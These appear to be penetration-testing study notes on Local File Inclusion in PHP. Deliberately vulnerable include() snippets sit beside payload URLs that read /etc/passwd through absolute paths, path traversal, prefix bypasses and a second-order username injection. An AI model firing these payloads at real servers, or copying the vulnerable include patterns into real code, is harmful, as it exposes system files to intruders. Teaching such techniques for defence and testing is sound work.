## **Local File Inclusion (LFI)**

LFI allows an attacker to read local files on the back-end server by manipulating parameters used to include files dynamically.

#### **1. Basic LFI (Absolute Path)**

If the web application passes user input directly into an inclusion function without any additions, you can read files using their absolute path.

- **Target Files:**
    - Linux: `/etc/passwd`
    - Windows: `C:\Windows\boot.ini`
- **Vulnerable Code:**
    
    ```
    include($_GET['language']);
    ```
    
- **Payload / URL:**
    
    ```
    http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd
    ```
    

#### **2. Path Traversal (Directory Traversal)**

If the application prepends a directory path to the user input, absolute paths will fail because the file won't exist in that specific directory.

- **Vulnerable Code:**
    
    ```
    include("./languages/" . $_GET['language']);
    ```
    
- **Bypass:** Use `../` (dot-dot-slash) to traverse up to the root directory before specifying the target file. (e.g., `../../../` goes up 3 directories). If you reach the root directory `/`, adding extra `../` will keep you at the root, so it is safe to over-estimate.
- **Payload / URL:**
    
    ```
    http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/passwd
    ```
    

#### **3. Bypassing Filename Prefixes**

If the application appends your input directly to a string prefix (rather than a directory), standard path traversal will result in an invalid filename.

- *Vulnerable Code:**PHP
    
    ```
    include("lang_" . $_GET['language']);
    ```
    
- *(Failing Payload)*: `../../../etc/passwd` becomes `lang_../../../etc/passwd`
- **Bypass:** Prefix your payload with a `/`. This tricks the system into treating the prefix string (`lang_`) as a directory name, allowing the traversal to work (though it depends on if the OS tolerates the non-existent virtual directory).
- *Payload / URL:**Plaintext
    
    ```
    http://<SERVER_IP>:<PORT>/index.php?language=/../../../etc/passwd
    ```
    

#### **4. Appended Extensions**

A common defense or development practice is automatically appending an extension (like `.php`) to the parameter.

- *Vulnerable Code:**PHP
    
    ```
    include($_GET['language'] . ".php");
    ```
    
- *Failing URL:**Plaintext
    
    ```
    http://<SERVER_IP>:<PORT>/extension/index.php?language=/etc/passwd
    ```
    
    *(This attempts to load `/etc/passwd.php`, which doesn't exist. Bypasses for this are covered in advanced LFI techniques).*
    

#### 5. Second-Order LFI Attacks

LFI vulnerabilities are not limited to direct URL parameters (like `?page=`). They can occur when the application pulls a file based on an indirectly controlled value stored in a database.

- **Concept:** You inject an LFI payload into a trusted database field (e.g., setting your account username to `../../../etc/passwd`).
- **Execution:** When a different feature of the app tries to load a resource based on that database entry (e.g., fetching a profile avatar via `/profile/$username/avatar.png`), the payload triggers, returning the targeted system file instead of the intended resource.
